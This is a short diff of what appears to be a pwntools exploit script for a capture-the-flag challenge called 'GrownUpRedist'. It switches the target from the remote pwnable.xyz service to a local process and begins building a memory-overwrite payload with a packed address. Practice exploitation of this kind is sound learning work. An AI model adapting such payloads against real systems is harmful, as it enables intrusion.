@@ -5,8 +5,8 @@ from pwn import *
 #     for c in range(ord(c1), ord(c2)+1):
 #         yield chr(c)
 
-# p = process('./GrownUpRedist')
-p = remote('svc.pwnable.xyz', 30004)
+p = process('./GrownUpRedist')
+# p = remote('svc.pwnable.xyz', 30004)
 
 p.recvuntil(': ')
 payload = b'y1111111' + p32(0x601080)
